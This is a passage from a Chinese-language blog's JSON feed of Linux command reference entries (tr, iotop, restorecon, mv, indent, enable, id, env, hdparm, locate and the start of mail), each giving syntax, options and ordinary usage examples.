或--truncate-set1：先删除第一字符集较第二字符集多出的字符。 参数 字符集 1：指定要转换或删除的原字符集。当执行转换操作时，必须使用参数“字符集 2”指定转换的目标字符集。但执行删除操作时，不需要参数“字符集 2”； 字符集 2：指定要转换成的目标字符集。 实例 将输入字符由大写转换为小写： echo &quot;HELLO WORLD&quot; | tr 'A-Z' 'a-z' hello world 'A-Z' 和 'a-z' 都是集合，集合是可以自己制定的，例如：'ABD-}'、'bB.,'、'a-de-h'、'a-c0-9' 都属于集合，集合里可以使用 '\\n'、'\\t'，可以可以使用其他 ASCII 字符。 使用 tr 删除字符： echo &quot;hello 123 world 456&quot; | tr -d '0-9' hello world 将制表符转换为空格： cat text | tr '&lt;span title=&quot;\\t&quot;&gt;\\t' ' ' 字符集补集，从输入文本中将不在补集中的所有字符删除： echo aa.,a 1 b#$bb 2 c*/cc 3 ddd 4 | tr -d -c '0-9 \\n' 1 2 3 4 此例中，补集中包含了数字 0~9、空格和换行符\\n，所以没有被删除，其他字符全部被删除了。 用 tr 压缩字符，可以压缩输入中重复的字符： echo &quot;thissss is a text linnnnnnne.&quot; | tr -s ' sn' this is a text line. 巧妙使用 tr 做数字相加操作： echo 1 2 3 4 5 6 7 8 9 | xargs -n1 | echo $[ $(tr '&lt;span title=&quot;\\n&quot;&gt;\\n' '+') 0 ] 删除 Windows 文件“造成”的 '^M' 字符： cat file | tr -s &quot;&lt;span title=&quot;\\r&quot;&gt;\\r&quot; &quot;&lt;span title=&quot;\\n&quot;&gt;\\n&quot; &gt; new_file 或 cat file | tr -d &quot;&lt;span title=&quot;\\r&quot;&gt;\\r&quot; &gt; new_file tr 可以使用的字符类： [:alnum:]：字母和数字 [:alpha:]：字母 [:cntrl:]：控制（非打印）字符 [:digit:]：数字 [:graph:]：图形字符 [:lower:]：小写字母 [:print:]：可打印字符 [:punct:]：标点符号 [:space:]：空白字符 [:upper:]：大写字母 [:xdigit:]：十六进制字符 使用方式： tr '[:lower:]' '[:upper:]' ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"tr","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/tr/","stats":{"text":"3 min read","time":162000,"words":642,"minutes":3},"date":"2022-02-03 15:18:41","dateFormat":"2022-02-03"},{"content":"用来监视磁盘 I/O 使用状况的工具。 补充说明 iotop 命令是一个用来监视磁盘 I/O 使用状况的 top 类工具。iotop 具有与 top 相似的 UI，其中包括 PID、用户、I/O、进程等相关信息。Linux 下的 IO 统计工具如 iostat，nmon 等大多数是只能统计到 per 设备的读写情况，如果你想知道每个进程是如何使用 IO 的就比较麻烦，使用 iotop 命令可以很方便的查看。 iotop 使用 Python 语言编写而成，要求 Python2.5（及以上版本）和 Linux kernel2.6.20（及以上版本）。iotop 提供有源代码及 rpm 包，可从其官方主页下载。 安装 Ubuntu apt-get install iotop CentOS yum install iotop 编译安装 wget http://guichaz.free.fr/iotop/files/iotop-0.4.4.tar.gz tar zxf iotop-0.4.4.tar.gz python setup.py build python setup.py install 语法 iotop（选项） 选项 -o：只显示有 io 操作的进程 -b：批量显示，无交互，主要用作记录到文件。 -n NUM：显示 NUM 次，主要用于非交互式模式。 -d SEC：间隔 SEC 秒显示一次。 -p PID：监控的进程 pid。 -u USER：监控的进程用户。 iotop 常用快捷键： 左右箭头：改变排序方式，默认是按 IO 排序。 r：改变排序顺序。 o：只显示有 IO 输出的进程。 p：进程/线程的显示方式的切换。 a：显示累积使用量。 q：退出。 实例 直接执行 iotop 就可以看到效果了： Total DISK read: 0.00 B/s | Total DISK write: 0.00 B/s TID PRIO USER DISK READ DISK WRITE SWAPIN IO&gt; command 1 be/4 root 0.00 B/s 0.00 B/s 0.00 % 0.00 % init [3] 2 be/4 root 0.00 B/s 0.00 B/s 0.00 % 0.00 % [kthreadd] 3 rt/4 root 0.00 B/s 0.00 B/s 0.00 % 0.00 % [migration/0] 4 be/4 root 0.00 B/s 0.00 B/s 0.00 % 0.00 % [ksoftirqd/0] 5 rt/4 root 0.00 B/s 0.00 B/s 0.00 % 0.00 % [watchdog/0] 6 rt/4 root 0.00 B/s 0.00 B/s 0.00 % 0.00 % [migration/1] 7 be/4 root 0.00 B/s 0.00 B/s 0.00 % 0.00 % [ksoftirqd/1] 8 rt/4 root 0.00 B/s 0.00 B/s 0.00 % 0.00 % [watchdog/1] 9 be/4 root 0.00 B/s 0.00 B/s 0.00 % 0.00 % [events/0] 10 be/4 root 0.00 B/s 0.00 B/s 0.00 % 0.00 % [events/1] 11 be/4 root 0.00 B/s 0.00 B/s 0.00 % 0.00 % [khelper] 2572 be/4 root 0.00 B/s 0.00 B/s 0.00 % 0.00 % [bluetooth] ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"iotop","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/iotop/","stats":{"text":"4 min read","time":181000,"words":619,"minutes":4},"date":"2022-02-03 15:18:13","dateFormat":"2022-02-03"},{"content":"恢复文件的安全上下文。 补充说明 restorecon 命令用来恢复 SELinux 文件属性即恢复文件的安全上下文。 语法 restorecon [-iFnrRv] [-e excludedir ] [-o filename ] [-f filename | pathname...] 选项 -i：忽略不存在的文件。 -f：infilename 文件 infilename 中记录要处理的文件。 -e：directory 排除目录。 -R/-r：递归处理目录。 -n：不改变文件标签。 -o/outfilename：保存文件列表到 outfilename，在文件不正确情况下。 -v：将过程显示到屏幕上。 -F：强制恢复文件安全语境。 实例 假设 CentOS 安装了 apache，网页默认的主目录是/var/www/html，我们经常遇到这样的问题，在其他目录中创建了一个网页文件，然后用 mv 移动到网页默认目录/var/www/html中，但是在浏览器中却打不开这个文件，这很可能是因为这个文件的 SELinux 配置信息是继承原来那个目录的，与/var/www/html目录不同，使用 mv 移动的时候，这个 SELinux 配置信息也一起移动过来了，从而导致无法打开页面，具体请看下面的实例： 使用 CentOS 举例,如果默认没有安装 apache，确保网络连接，使用下面的命令安装 [root@jsdig.com ~]# yum install httpd # 我们在 root 的家目录新建一个 html 文件 [root@jsdig.com ~]# pwd /root [root@jsdig.com ~]# vi index.html # 随便输入一段文字，保存退出 welcome to www.jsdig.com # 将这个文件 mv 到网页默认目录下 [root@jsdig.com ~]# mv index.html /var/www/html/ # # 这个时候我们使用 firefox 浏览器输入 127.0.0.1/index.html 发现打不开， # 查看一下 SELinux 的日志文件，发现了下面这一段报错信息，从这个报错信息不难看出， # 进程 httpd 访问网页主目录中的 index.html 时被 SELinux 阻止，原因是因为，SELinux 配置信息不正确, # 正确的 SELinux 配置信息应该是 scontext=后面的部分， # 而 index.html 文件的 SELinux 配置信息却是 tcontext=后面的部分， # 从 tcontext=的第三段“admin_home_t”不难看出，这个文件的 SELinux 配置信息是 root 用户家目录的。 # type=AVC msg=audit(1378974214.610:465): avc: denied { open } for pid=2359 comm=&quot;httpd&quot; path=&quot;/var/www/html/index.html&quot; dev=&quot;sda1&quot; ino=1317685 scontext=system_u:system_r:httpd_t:s0 tcontext=unconfined_u:object_r:admin_home_t:s0 tclass=file 使用 ls -Z 也可以看出,文件和目录的 SELinux 信息不匹配 [root@jsdig.com html]# ls -Z /var/www/html/ .... unconfined_u:object_r:admin_home_t:s0 index.html [root@jsdig.com html]# ls -Zd /var/www/html/ .... system_u:object_r:httpd_sys_content_t:s0 /var/www/html/ 使用 restorecon 来恢复网页主目录中所有文件的 SELinux 配置信息 (如果目标为一个目录，可以添加-R 参数递归) [root@jsdig.com html]# restorecon -R /var/www/html/ ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"restorecon","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/restorecon/","stats":{"text":"3 min read","time":171000,"words":691,"minutes":3},"date":"2022-02-03 15:17:57","dateFormat":"2022-02-03"},{"content":"用来对文件或目录重新命名。 补充说明 mv 命令用来对文件或目录重新命名，或者将文件从一个目录移到另一个目录中。source 表示源文件或目录，target 表示目标文件或目录。如果将一个文件移到一个已经存在的目标文件中，则目标文件的内容将被覆盖。 mv 命令可以用来将源文件移至一个目标文件中，或将一组文件移至一个目标目录中。源文件被移至目标文件有两种不同的结果： 如果目标文件是到某一目录文件的路径，源文件会被移到此目录下，且文件名不变。 如果目标文件不是目录文件，则源文件名（只能有一个）会变为此目标文件名，并覆盖己存在的同名文件。如果源文件和目标文件在同一个目录下，mv 的作用就是改文件名。当目标文件是目录文件时，源文件或目录参数可以有多个，则所有的源文件都会被移至目标文件中。所有移到该目录下的文件都将保留以前的文件名。 注意事项：mv 与 cp 的结果不同，mv 好像文件“搬家”，文件个数并未增加。而 cp 对文件进行复制，文件个数增加了。 语法 mv (选项) (参数) 选项 --backup=&lt;备份模式&gt;：若需覆盖文件，则覆盖前先行备份； -b：当文件存在时，覆盖前，为其创建一个备份； -f：若目标文件或目录与现有的文件或目录重复，则直接覆盖现有的文件或目录； -i：交互式操作，覆盖前先行询问用户，如果源文件与目标文件或目标目录中的文件同名，则询问用户是否覆盖目标文件。用户输入”y”，表示将覆盖目标文件；输入”n”，表示取消对源文件的移动。这样可以避免误将文件覆盖。 --strip-trailing-slashes：删除源文件中的斜杠“/”； -S&lt;后缀&gt;：为备份文件指定后缀，而不使用默认的后缀； --target-directory=&lt;目录&gt;：指定源文件要移动到目标目录； -u：当源文件比目标文件新或者目标文件不存在时，才执行移动操作。 参数 源文件：源文件列表。 目标文件：如果“目标文件”是文件名则在移动文件的同时，将其改名为“目标文件”；如果“目标文件”是目录名则将源文件移动到“目标文件”下。 实例 将目录/usr/men中的所有文件移到当前目录（用.表示）中： mv /usr/men/* . 移动文件 mv file_1.txt /home/office/ 移动多个文件 mv file_2.txt file_3.txt file_4.txt /home/office/ mv *.txt /home/office/ 移动目录 mv directory_1/ /home/office/ 重命名文件或目录 mv file_1.txt file_2.txt # 将文件 file_1.txt 改名为 file_2.txt 重命名目录 mv directory_1/ directory_2/ 打印移动信息 mv -v *.txt /home/office 提示是否覆盖文件 mv -i file_1.txt /home/office 源文件比目标文件新时才执行更新 mv -uv *.txt /home/office 不要覆盖任何已存在的文件 mv -vn *.txt /home/office 复制时创建备份 mv -bv *.txt /home/office 无条件覆盖已经存在的文件 mv -f *.txt /home/office ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"mv","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/mv/","stats":{"text":"4 min read","time":189000,"words":863,"minutes":4},"date":"2022-02-03 15:17:43","dateFormat":"2022-02-03"},{"content":"格式化 C 语言的源文件。 补充说明 indent 命令可辨识 C 的原始代码文件，并加以格式化，以方便程序员阅读、修改等操作。 语法 indent (选项)(源文件) 或 indent（选项)(源文件)(-o 目标文件) 选项 -bad：在声明区加上空白行； -bap：添加空白行； -bbb：在注释后面添加空白行； -bc：在声明段中，如果出现逗号就换行； -bl：if（或是 else、for 等）与后面执行区段的“{”不同行，且“}”自成一行-bli&lt;缩排格数&gt;设置 {} 缩排的格数； -br：if（或是 else、for 等）与后面执行区段的“{”同行，且“}”自成一行； -bs：在 sizeof 之后空一格； -c&lt;栏数&gt;：将注释置于程序右侧指定的栏位； -cd&lt;栏数&gt;：将注释置于声明右侧指定的栏位； -cdb：注释符号自成一行； -ce：将 else 置于“}”（if 执行区段的结尾）之后； -ci：&lt;缩排格数&gt;：叙述过长而换行时，指定换行后缩排的格数； -cli&lt;缩排格数&gt;：使用 case 时，switch 缩排的格数； -cp&lt;栏数&gt;：将注释置于 else 与 elseif 叙述右侧指定的栏位； -cs：在 case 之后空一格； -d&lt;缩排格数&gt;：针对不是放在程序码右侧的注释，设置其缩排格数； -di&lt;栏数&gt;：将声明区段的变量置于指定的栏位； -fc1：针对放在每行最前端的注释，设置其格式； -fca：设置所有注释的格式； -gnu：使用指定的 GNU 格式，该参数为默认值； -i&lt;格数&gt;：设置缩排的格数； -ip&lt;格数&gt;：设置参数的缩排格数； -kr：指定使用 Kernighan&amp;Ritchie 的格式； -lp：叙述过长而换行，且叙述中包含了括号时，将括号中的每行起始栏位内容垂直对其排列； -nbad：在声明区段后不要加上空白行； -nbap：在程序后面不添加空白行； -nbbb：在注释段后面不添加空白行； -nbc：在声明段中，即使出现逗号，也不换行； -ncdb：注释符号不自成一行； -nce：不将 else 置于“}”后面； -ncs：不在 case 后面空一格； -nfc1：不要格式化放在每行最前端的注释； -nfca：不用格式化任何的注释； -nip：参数不要缩排； -nlp：叙述过长而换行，且叙述中包含了括号时，不用将括号中的每行起始栏位垂直对其排列； -npcs：在调用函数名之后，不要添加空格； -npro：不要读取 indent 的配置文件“.indent.pro”； -npsl：程序类型与程序名称放在同一行； -nsc：注释左侧不要添加星号； -nsob：不用处理多余的空白行； -nss：若 for 或 while 区段仅有一行时，在分号前不加空格； -nv：不显示详细的信息； -orig：使用 berkeley 格式； -pcs：在调用函数名与“{”之间添加空格； -psl：程序类型置于程序名称的前一行； -sc：在每行注释左侧添加星号； -sob：删除多余的空白行； -ss：若 for 或 swile 区段仅有一行时，在分号前加上空格； -st：将结果显示在标准输出设备上； -T：数据类型名称缩排； -ts&lt;格数&gt;：设置 tab 的长度； -v：显示详细的执行过程； --version：显示版本信息。 实例 使用 indent 命令将 C 语言源文件&quot;test.c&quot;中所有的 sizeof 后面添加一个空格，输入如下命令： indent -bs /home/rootlocal/桌面/test.c 执行上面的命令后，用户可以打开指定的源文件查看在 sizeof 后面是否都添加了一个空格。由于该命令的参数非常多，所以用户可以根据实际需要选择适合的参数进行使用即可。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"indent","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/indent/","stats":{"text":"4 min read","time":215000,"words":969,"minutes":4},"date":"2022-02-03 15:17:28","dateFormat":"2022-02-03"},{"content":"启动或禁用 shell 内建命令。 概要 enable [-a] [-dnps] [-f filename] [name ...] 主要用途 禁用一到多个内建命令。 启用一到多个内建命令。 直接调用与禁用的内建命令同名且在 $PATH 路径下找到的外部命令。 打印所有内建命令，无论是否禁用。 打印处于启用状态的内建命令。 打印处于禁用状态的内建命令。 打印处于启用状态的 posix 标准内建命令。 打印处于禁用状态的 posix 标准内建命令。 打印 posix 标准内建命令，无论是否禁用。 从动态库中加载内建命令。 移除从动态库中加载的内建命令。 选项 -a 打印所有内建命令，无论是否禁用。 -d 移除从动态库中加载的内建命令。 -n 禁用内建命令或显示已禁用的内建命令。 -p 以可复用格式打印。 -s 只显示处于启动状态的 posix 标准内建命令。 -f 动态库中加载内建命令。 -ns 打印处于禁用状态的 posix 标准内建命令。 -as 打印 posix 标准内建命令，无论是否禁用。 参数 filename：动态库文件名。 name（可选）：内建命令，可以为多个。 返回值 enable 返回成功，除非 name 不是内建命令或有错误发生。 例子（以下内容限于篇幅不再列出返回值部分） # posix special builtin # 假设没有任何内建命令被禁用 # 禁用两个 posix 标准内建命令 enable -n set source # 打印处于禁用状态的 posix 标准内建命令 enable -ns # 打印 posix 标准内建命令，无论是否禁用。 enable -as # 打印处于启用状态的 posix 标准内建命令 enable -s # 假设没有任何内建命令被禁用 # 禁用一到多个内建命令 enable -n echo pwd # 打印所有内建命令，无论是否禁用。 enable -a # 打印处于启用状态的内建命令 enable # 打印处于禁用状态的内建命令 enable -n # 启用一到多个内建命令 enable pwd Q&amp;A Q：请问-f，-d，-p的演示呢？ A：说明一下，-f与-d限于个人能力没有找到合适的例子，如果您有更好的例子欢迎提 pr； 经过我验证-p选项是否使用好像没有区别，可以比较enable -p|cat -A和enable|cat -A 有什么区别。（注：cat -A用于显示不可见字符） Q：是否可以禁用enable自己？之后还能禁用或启用内建命令吗？ A：可以；不能。 注意 linux shell 命令执行时，shell 总是先在自己的 shell builtin 中查找该命令，如果找到则执行该命令；如果找不到该命令，则会从环境变量$PATH指定的路径中依次去查找待执行的命令。看起来好像没有办法编写用户自己的命令来替代 shell builtin 命令。幸运的是，有了enable命令我们就能做到了。 关于同名命令调用的优先级的知识，请先参考builtin命令的提示部分，然后继续阅读下面部分； 当内建命令echo没有禁用时，如果要调用外部命令echo，只能这样写/usr/bin/echo； 当我们禁用了echo后，优先级顺序变成了这样： 函数 &gt; 外部命令 如果执行命令的环境没有echo函数，那么调用的echo就是外部命令。 该命令是 bash 内建命令，相关的帮助信息请查看 help 命令。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"enable","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/enable/","stats":{"text":"4 min read","time":198000,"words":905,"minutes":4},"date":"2022-02-03 15:15:58","dateFormat":"2022-02-03"},{"content":"打印真实以及有效的用户和所在组的信息。 概要 id [OPTION]... [USER]... 主要用途 没有选项时，打印指定用户 ID 信息。 选项 -a 兼容性选项，没有实际作用。 -Z, --context 只打印进程的安全上下文。 -g, --group 只打印有效的组 ID。 -G, --groups 打印全部组 ID。 -u, --user 只打印有效的用户 ID。 -z, --zero 使用空字符代替默认的空格来分隔条目。 --help 显示帮助信息并退出。 --version 显示版本信息并退出。 只有在使用 -u -g -G 选项中一到多个时，以下选项可以使用： -n, --name 打印名称而不是数字。 -r, --real 打印真实 ID 而不是有效 ID。 参数 user（可选）：可以为一到多个，默认为当前用户。 返回值 返回 0 表示成功，返回非 0 值表示失败。 例子 [root@localhost ~]# id uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) 解释：用户 root 的 UID 号码 = 0，GID 号码 = 0。用户 root 是下面组的成员： root 组 GID 号是：0 bin 组 GID 号是：1 daemon 组 GID 号是：2 sys 组 GID 号是：3 adm 组 GID 号是：4 disk 组 GID 号是：6 wheel 组 GID 号是：10 打印用户名、UID 和该用户所属的所有组，要这么做，我们可以使用 -a 选项： [root@localhost ~]# id -a uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) 输出所有不同的组 ID ，有效的，真实的和补充的，我们可以使用 -G 选项来实现： [root@localhost ~]# id -G 0 1 2 3 4 6 10 结果只会显示 GID 号。你可以和/etc/group文件比较。下面是/etc/group文件的示例内容： 只输出有效的组 ID，通过使用 -g 选项来只输出有效组 ID： [root@localhost ~]# id -g 0 输出特定用户信息，我们可以输出特定的用户信息相关的 UID 和 GID。只需要在 id 命令后跟上用户名： [root@localhost ~]# id www uid=500(www) gid=500(www) groups=500(www) 注意 该命令可以显示真实有效的用户 ID(UID) 和组 ID(GID)。UID 是对一个用户的单一身份标识。组 ID（GID）则对应多个 UID；一些程序可能需要 UID/GID 来运行。id 使我们更加容易地找出用户的 UID 以及 GID，而不必在 /etc/group 文件中搜寻。 该命令是GNU coreutils包中的命令，相关的帮助信息请查看man -s 1 id，info coreutils 'id invocation'。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"id","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/id/","stats":{"text":"3 min read","time":158000,"words":637,"minutes":3},"date":"2022-02-03 15:15:46","dateFormat":"2022-02-03"},{"content":"显示系统中已存在的环境变量。 补充说明 env 命令用于显示系统中已存在的环境变量，以及在定义的环境中执行指令。该命令只使用&quot;-&quot;作为参数选项时，隐藏了选项&quot;-i&quot;的功能。若没有设置任何选项和参数时，则直接显示当前的环境变量。 如果使用 env 命令在新环境中执行指令时，会因为没有定义环境变量&quot;PATH&quot;而提示错误信息&quot;such file or directory&quot;。此时，用户可以重新定义一个新的&quot;PATH&quot;或者使用绝对路径。 语法 env (选项) (参数) 选项 -i：开始一个新的空的环境； -u&lt;变量名&gt;：从当前环境中删除指定的变量。 参数 变量定义：定义在新的环境中变量，定义多个变量定义用空格隔开。格式为“变量名=值”； 指定：指定要执行的指令和参数。 实例 [root@localhost ~]# env hostname=LinServ-1 TERM=linux SHELL=/bin/bash HISTSIZE=1000 SSH_CLIENT=192.168.2.111 2705 22 SSH_TTY=/dev/pts/0 USER=root LS_COLORS=no=00:fi=00:di=01;34:ln=01;36:pi=40;33:so=01;35:bd=40;33;01:cd=40;33;01:or=01;05;37;41:mi=01;05;37;41:ex=01;32:*.cmd=01;32:*.exe=01;32:*.com=01;32:*.btm=01;32:*.bat=01;32:*.sh=01;32:*.csh=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.gz=01;31:*.bz2=01;31:*.bz=01;31:*.tz=01;31:*.rpm=01;31:*.cpio=01;31:*.jpg=01;35:*.gif=01;35:*.bmp=01;35:*.xbm=01;35:*.xpm=01;35:*.png=01;35:*.tif=01;35: mail=/var/spool/mail/root PATH=/usr/kerberos/sbin:/usr/kerberos/bin:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin INPUTRC=/etc/inputrc pwd=/root LANG=zh_CN.UTF-8 SHLVL=1 HOME=/root logname=root SSH_CONNECTION=192.168.2.111 2705 192.168.2.2 22 LESSOPEN=|/usr/bin/lesspipe.sh %s G_BROKEN_FILENAMES=1 _=/bin/env ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"env","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/env/","stats":{"text":"3 min read","time":134000,"words":469,"minutes":3},"date":"2022-02-03 15:15:30","dateFormat":"2022-02-03"},{"content":"显示与设定硬盘的参数。 补充说明 hdparm 命令提供了一个命令行的接口用于读取和设置 IDE 或 SCSI 硬盘参数。 语法 hdparm (选项) (参数) 选项 -a&lt;快取分区&gt;：设定读取文件时，预先存入块区的分区数，若不加上&lt;快取分区&gt;选项，则显示目前的设定； -A&lt;0 或 1&gt;：启动或关闭读取文件时的快取功能； -c&lt;I/O 模式&gt;：设定 IDE32 位 I/O 模式； -C：检测 IDE 硬盘的电源管理模式； -d&lt;0 或 1&gt;：设定磁盘的 DMA 模式； -f：将内存缓冲区的数据写入硬盘，并清楚缓冲区； -g：显示硬盘的磁轨，磁头，磁区等参数； -h：显示帮助； -i：显示硬盘的硬件规格信息，这些信息是在开机时由硬盘本身所提供； -I：直接读取硬盘所提供的硬件规格信息； -k&lt;0 或 1&gt;：重设硬盘时，保留-dmu 参数的设定； -K&lt;0 或 1&gt;：重设硬盘时，保留-APSWXZ 参数的设定； -m&lt;磁区数&gt;：设定硬盘多重分区存取的分区数； -n&lt;0 或 1&gt;：忽略硬盘写入时所发生的错误； -p&lt;PIO 模式&gt;：设定硬盘的 PIO 模式； -P&lt;磁区数&gt;：设定硬盘内部快取的分区数； -q:在执行后续的参数时，不在屏幕上显示任何信息； -r&lt;0 或 1&gt;:设定硬盘的读写模式； -S&lt;时间&gt;:设定硬盘进入省电模式前的等待时间； -t;评估硬盘的读取效率； -T：平谷硬盘快取的读取效率； -u&lt;0 或 1&gt;：在硬盘存取时，允许其他中断要求同时执行； -v：显示硬盘的相关设定； -w&lt;0 或 1&gt;：设定硬盘的写入快取； -X&lt;传输模式&gt;：设定硬盘的传输模式； -y：使 IDE 硬盘进入省电模式； -Y：使 IDE 硬盘进入睡眠模式； -Z：关闭某些 Seagate 硬盘的自动省电功能。 参数 设备文件：指定 id 驱动对应的设备文件名。 实例 显示硬盘的相关设置： hdparm /dev/sda /dev/sda: IO_support = 0 (default 16-bit) readonly = 0 (off) readahead = 256 (on) geometry = 19457［柱面数］/255［磁头数］/63［扇区数］, sectors = 312581808［总扇区数］, start = 0［起始扇区数］ ```shell 显示硬盘的柱面、磁头、扇区数： ```shell hdparm -g /dev/sda /dev/sda: geometry = 19457［柱面数］/255［磁头数］/63［扇区数］, sectors = 312581808［总扇区数］, start = 0［起始扇区数］ 测试硬盘的读取速度： hdparm -T /dev/sda /dev/sda: Timing cached reads: 4684 MB in 2.00 seconds = 2342.92 MB/sec 测试硬盘缓存的读取速度： hdparm -T /dev/xvda /dev/xvda: Timing cached reads: 11154 MB in 1.98 seconds = 5633.44 MB/sec 检测硬盘的电源管理模式： hdparm -C /dev/sda /dev/sda: drive state is: standby [省电模式 ] 查询并设置硬盘多重扇区存取的扇区数，以增进硬盘的存取效率： hdparm -m /dev/sda hdparm -m #参数值为整数值如 8 /dev/sda 附：硬盘坏道修复方法 检查：smartctl -l selftest /dev/sda 卸载：umount /dev/sda* 修复：badblocks /dev/sda ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"hdparm","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/hdparm/","stats":{"text":"4 min read","time":196000,"words":805,"minutes":4},"date":"2022-02-03 15:12:51","dateFormat":"2022-02-03"},{"content":"比 find 好用的文件查找工具。 补充说明 locate 让使用者可以很快速的搜寻档案系统内是否有指定的档案。其方法是先建立一个包括系统内所有档案名称及路径的数据库，之后当寻找时就只需查询这个数据库，而不必实际深入档案系统之中了。在一般的 distribution 之中，数据库的建立都被放在 crontab 中自动执行。 locate 命令可以在搜寻数据库时快速找到档案，数据库由 updatedb 程序来更新，updatedb 是由 cron daemon 周期性建立的，locate 命令在搜寻数据库时比由整个由硬盘资料来搜寻资料来得快，但较差劲的是 locate 所找到的档案若是最近才建立或 刚更名的，可能会找不到，在内定值中，updatedb 每天会跑一次，可以由修改 crontab 来更新设定值。(etc/crontab) locate 指定用在搜寻符合条件的档案，它会去储存档案与目录名称的数据库内，寻找合乎范本样式条件的档案或目录录，可以使用特殊字元（如”” 或”?”等）来指定范本样式，如指定范本为 kcpaner, locate 会找出所有起始字串为 kcpa 且结尾为 ner 的档案或目录，如名称为 kcpartner 若目录录名称为 kcpa_ner 则会列出该目录下包括 子目录在内的所有档案。 locate 指令和 find 找寻档案的功能类似，但 locate 是透过 update 程序将硬盘中的所有档案和目录资料先建立一个索引数据库，在 执行 loacte 时直接找该索引，查询速度会较快，索引数据库一般是由操作系统管理，但也可以直接下达 update 强迫系统立即修改索引数据库。 语法 locate [选择参数 ] [样式 ] 选项 -b, --basename # 仅匹配路径名的基本名称 -c, --count # 只输出找到的数量 -d, --database DBPATH # 使用 DBPATH 指定的数据库，而不是默认数据库 /var/lib/mlocate/mlocate.db -e, --existing # 仅打印当前现有文件的条目 -1 # 如果 是 1．则启动安全模式。在安全模式下，使用者不会看到权限无法看到 的档案。这会始速度减慢，因为 locate 必须至实际的档案系统中取得档案的 权限资料。 -0, --null # 在输出上带有 NUL 的单独条目 -S, --statistics # 不搜索条目，打印有关每个数据库的统计信息 -q # 安静模式，不会显示任何错误讯息。 -P, --nofollow, -H # 检查文件存在时不要遵循尾随的符号链接 -l, --limit, -n LIMIT # 将输出（或计数）限制为 LIMIT 个条目 -n # 至多显示 n 个输出。 -m, --mmap # 被忽略，为了向后兼容 -r, --regexp REGEXP # 使用基本正则表达式 --regex # 使用扩展正则表达式 -q, --quiet # 安静模式，不会显示任何错误讯息 -s, --stdio # 被忽略，为了向后兼容 -o # 指定资料库存的名称。 -h, --help # 显示帮助 -i, --ignore-case # 忽略大小写 -V, --version # 显示版本信息 实例 实例 1：查找和 pwd 相关的所有文件 root ~ # locate pwd /bin/pwd /etc/.pwd.lock /sbin/unix_chkpwd /usr/bin/pwdx /usr/include/pwd.h /usr/lib/python2.7/dist-packages/twisted/python/fakepwd.py /usr/lib/python2.7/dist-packages/twisted/python/fakepwd.pyc /usr/lib/python2.7/dist-packages/twisted/python/test/test_fakepwd.py /usr/lib/python2.7/dist-packages/twisted/python/test/test_fakepwd.pyc /usr/lib/syslinux/pwd.c32 /usr/share/help/C/empathy/irc-join-pwd.page /usr/share/help/ca/empathy/irc-join-pwd.page /usr/share/help/cs/empathy/irc-join-pwd.page /usr/share/help/de/empathy/irc-join-pwd.page /usr/share/help/el/empathy/irc-join-pwd.page 实例 2： 搜索 etc 目录下所有以 sh 开头的文件 root ~ # locate /etc/sh /etc/shadow /etc/shadow- /etc/shells 实例 3：搜索 etc 目录下，所有以 m 开头的文件 root ~ # locate /etc/m /etc/magic /etc/magic.mime /etc/mailcap /etc/mailcap.order /etc/manpath.config /etc/mate-settings-daemon ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"locate","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/locate/","stats":{"text":"4 min read","time":238000,"words":992,"minutes":4},"date":"2022-02-03 15:12:38","dateFormat":"2022-02-03"},{"content":"命令行下发送和接收电子邮件。 补充说明 mail 命令是命令行的电子邮件发送和接收工具。操作的界面不像 elm 或 pine 那么容易使用，但功能非常完整。 语法 mail (选项) (参数) 选项 -b&lt;地址&gt;：指定密件副本的收信人地址； -c&lt;地址&gt;：指定副本的收信人地址； -f&lt;邮件文件&gt;：读取指定邮件文件中的邮件； -i：不显示终端发出的信息； -I：使用互动模式； -n：程序使用时，不使用 mail.rc 文件中的设置； -N：阅读邮件时，不显示邮件的标题； -s&lt;邮件主题&gt;：指定邮件的主题； -u&lt;用户帐号&gt;：读取指定用户的邮件； -v：执行时，显示详细的信息。 参数 邮件地址：收信人的电子邮箱地址。 实例 直接使用 shell 当编辑器 mail -s &quot;Hello from example.com by shell&quot; admin@example.com hello,this is the content of mail. welcome to www.example.com 